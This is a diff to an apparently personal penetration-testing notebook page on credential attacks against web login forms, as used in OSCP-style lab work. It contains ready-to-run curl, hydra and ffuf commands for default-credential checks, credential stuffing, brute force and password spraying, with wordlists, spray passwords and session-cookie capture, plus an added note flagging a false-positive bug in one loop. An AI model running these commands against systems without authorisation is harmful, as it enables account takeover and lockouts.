@@ -1,8 +1,6 @@
 
 Credential-based attacks against discovered login forms. Entry from [[Web Attack Checksheet]] sub-block 1.6 on login-form observation (fires Sections 1-4) and sub-block 1.14 on populated `users_<host>.txt` (fires Section 5).
 
-Sister files: [[Login Bypass Techniques]] (injection, tampering, direct access), [[Username Enumeration]] (populates `users_<host>.txt`), [[Session Cookie Attacks]] (session/JWT), [[MFA Bypass]] (multi-step).
-
 Ordering: default creds first (30-sec cost, high P on OSCP+); credential stuffing next (if external pair list); hit-and-hope brute force with common usernames (no enum required); password spray (one password × many users, evades lockout); enum-fed brute force last (requires target-enumerated usernames from [[Username Enumeration]]). Pre-flight checks cross-cut all sections — run once before Section 1.
 
 ---
@@ -25,7 +23,7 @@ Route on output:
 Send 10 known-bad login attempts against a known-invalid username. Watch for status changes, delays, or size deltas:
 
 ```bash
-for i in $(seq 1 10); do curl -sX POST -o /dev/null -w '[%{http_code}][size:%{size_download}][time:%{time_total}s]\n' -d 'username=xyzabc123xxx&password=wrong' http://<host>:<port>/<login_path>; done
+for i in $(seq 1 10); do curl -sX POST -o /dev/null -w '[%{http_code}][size:%{size_download}][time:%{time_total}s]\n' -d '<login_username_field>=xyzabc123xxx&<login_password_field>=wrong' http://<host>:<port>/<login_form_action>; done
 ```
 
 Route on output:
@@ -41,7 +39,7 @@ Save `<threads>` value for Sections 2-5.
 
 Send one deliberately invalid login. Response becomes `<fail_signal>` referenced by Sections 1-5.
 
-`curl -sX POST -i -d 'username=xyzabc123xxx&password=wrong' http://<host>:<port>/<login_path>`
+`curl -sX POST -i -d '<login_username_field>=xyzabc123xxx&<login_password_field>=wrong' http://<host>:<port>/<login_form_action>`
 
 From output, log:
 
@@ -63,7 +61,7 @@ Fastest highest-EV attempt. 30 seconds via automated loop.
 ```bash
 while IFS=: read -r u p; do
   echo -n "$u:$p → "
-  curl -sX POST -d "username=$u&password=$p" http://<host>:<port>/<login_path> | grep -q '<fail_signal>' && echo "fail" || echo "SUCCESS"
+    curl -sX POST -d "<login_username_field>=$u&<login_password_field>=$p" http://<host>:<port>/<login_form_action> | grep -q '<fail_signal>' && echo "fail" || echo "SUCCESS"
 done << 'EOF'
 admin:admin
 admin:password
@@ -79,6 +77,8 @@ guest:guest
 user:user
 EOF
 ```
+
+**THE ABOVE COMMAND IS PROBLEMATIC, BECAUSE YOU GET SUCCESS WHEN THE FAIL SIGNAL FAILS TO MATERIALISE, I.E. THE FORM GETS STOPPED PRE SUBMISSION BY JAVASCRIPT THAT CHECKS THAT THE PASSWORD FIELD IS NOT EMPTY. So `admin:` will give `SUCCESS` incorrectly, not because it is a successful log in but because the form never even submits.  **
 
 Any line printing `SUCCESS` → verified success → Section 6.
 
@@ -122,7 +122,7 @@ cut -d: -f2- pairs.txt > passwords.txt
 
 **ffuf pitchfork (aligned pairs, one attack per row):**
 
-`ffuf -w users.txt:U -w passwords.txt:P -mode pitchfork -X POST -d 'username=U&password=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fr '<fail_signal>' -t <threads> -o ffuf_stuff_<host>_<port>.json -of json`
+`ffuf -w users.txt:U -w passwords.txt:P -mode pitchfork -X POST -d '<login_username_field>=U&<login_password_field>=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> -fr '<fail_signal>' -t <threads> -o ffuf_stuff_<host>_<port>.json -of json`
 
 **Burp Intruder Pitchfork:**
 
@@ -149,13 +149,13 @@ Precondition: `<threads>` established from Pre-flight lockout probe. If lockout 
 
 **Hydra with common user/password shortlists:**
 
-`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -e nsr <host> http-post-form '/<login_path>:username=^USER^&password=^PASS^:F=<fail_signal>' -t <threads> -o hydra_hitand_<host>_<port>.txt -V`
+`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -e nsr <host> http-post-form '/<login_form_action>:<login_username_field>=^USER^&<login_password_field>=^PASS^:F=<fail_signal>' -t <threads> -o hydra_hitand_<host>_<port>.txt -V`
 
 `-e nsr` also tries: empty password, same-as-user, reversed-user.
 
 **ffuf cluster bomb variant:**
 
-`ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:P -mode clusterbomb -X POST -d 'username=U&password=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fr '<fail_signal>' -t <threads> -o ffuf_hitand_<host>_<port>.json -of json`
+`ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:P -mode clusterbomb -X POST -d '<login_username_field>=U&<login_password_field>=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> -fr '<fail_signal>' -t <threads> -o ffuf_hitand_<host>_<port>.json -of json`
 
 Route:
 
@@ -175,7 +175,7 @@ Precondition: username candidate list — use `/usr/share/seclists/Usernames/top
 ```bash
 for p in "Password1" "Password123" "Welcome1" "Winter2025!" "Summer2025!" "Autumn2025!" "Spring2025!" "Company123" "changeme"; do
   echo "=== spraying: $p ==="
-  hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p "$p" <host> http-post-form '/<login_path>:username=^USER^&password=^PASS^:F=<fail_signal>' -t <threads> -o "hydra_spray_${p}.txt" -V 2>/dev/null | grep -i 'login:'
+    hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p "$p" <host> http-post-form '/<login_form_action>:<login_username_field>=^USER^&<login_password_field>=^PASS^:F=<fail_signal>' -t <threads> -o "hydra_spray_${p}.txt" -V 2>/dev/null | grep -i 'login:'
 done
 ```
 
@@ -201,11 +201,11 @@ Precondition: `users_<host>.txt` contains one or more entries. If empty → this
 
 **Hydra with enumerated user list:**
 
-`hydra -L users_<host>.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -e nsr <host> http-post-form '/<login_path>:username=^USER^&password=^PASS^:F=<fail_signal>' -t <threads> -o hydra_enum_<host>_<port>.txt -V`
+`hydra -L users_<host>.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -e nsr <host> http-post-form '/<login_form_action>:<login_username_field>=^USER^&<login_password_field>=^PASS^:F=<fail_signal>' -t <threads> -o hydra_enum_<host>_<port>.txt -V`
 
 **ffuf cluster bomb variant:**
 
-`ffuf -w users_<host>.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt:P -mode clusterbomb -X POST -d 'username=U&password=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fr '<fail_signal>' -t <threads> -o ffuf_enum_<host>_<port>.json -of json`
+`ffuf -w users_<host>.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt:P -mode clusterbomb -X POST -d '<login_username_field>=U&<login_password_field>=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> -fr '<fail_signal>' -t <threads> -o ffuf_enum_<host>_<port>.json -of json`
 
 **Target-derived wordlist (Cewl).** If common wordlists exhaust with no hit, generate target-specific wordlist:
 
@@ -234,7 +234,7 @@ On verified successful login (recovered `<user>:<pass>`):
 
 3. Capture session cookie from successful response:
 
-    `curl -sX POST -i -d 'username=<user>&password=<pass>' http://<host>:<port>/<login_path> | grep -i '^Set-Cookie:'`
+	`curl -sX POST -i -d '<login_username_field>=<user>&<login_password_field>=<pass>' http://<host>:<port>/<login_form_action> | grep -i '^Set-Cookie:'`
 
 4. Route by post-login surface:
 
